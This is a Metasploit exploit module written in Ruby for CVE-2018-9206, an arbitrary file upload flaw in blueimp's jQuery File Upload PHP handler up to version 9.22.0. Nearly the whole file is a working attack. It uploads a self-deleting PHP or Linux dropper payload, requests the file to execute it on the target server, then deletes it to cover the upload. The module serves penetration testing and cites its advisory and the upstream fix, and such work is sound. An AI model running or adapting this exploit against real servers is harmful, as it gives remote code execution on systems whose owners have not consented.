##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => "blueimp's jQuery (Arbitrary) File Upload",
      'Description'    => %q{
        This module exploits an arbitrary file upload in the sample PHP upload
        handler for blueimp's jQuery File Upload widget in versions <= 9.22.0.
      },
      'Author'         => [
        'Larry W. Cashdollar', # Discovery and PoC
        'wvu'                  # Metasploit module
      ],
      'References'     => [
        ['CVE', '2018-9206'],
        ['URL', 'http://www.vapidlabs.com/advisory.php?v=204'],
        ['URL', 'https://github.com/blueimp/jQuery-File-Upload/pull/3514'],
        ['URL', 'https://github.com/lcashdol/Exploits/tree/master/CVE-2018-9206']
      ],
      'DisclosureDate' => 'Oct 9 2018',
      'License'        => MSF_LICENSE,
      'Platform'       => ['php', 'linux'],
      'Arch'           => [ARCH_PHP, ARCH_X86, ARCH_X64],
      'Privileged'     => false,
      'Targets'        => [
        ['PHP Dropper',   'Platform' => 'php',   'Arch' => ARCH_PHP],
        ['Linux Dropper', 'Platform' => 'linux', 'Arch' => [ARCH_X86, ARCH_X64]]
      ],
      'DefaultTarget'  => 0
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'jQuery File Upload base path', '/'])
    ])
  end

  def exploit
    f = "#{rand_text_alphanumeric(8..42)}.php"
    p = get_write_exec_payload(unlink_self: true)

    m = Rex::MIME::Message.new
    m.add_part(p, nil, nil, %(form-data; name="files[]"; filename="#{f}"))

    send_request_cgi(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, 'server/php/index.php'),
      'ctype'  => "multipart/form-data; boundary=#{m.bound}",
      'data'   => m.to_s
    )

    send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, "server/php/files/#{f}")
    )

    send_request_cgi(
      'method'   => 'DELETE',
      'uri'      => normalize_uri(target_uri.path, 'server/php/index.php'),
      'vars_get' => {'file' => f}
    )
  end

end
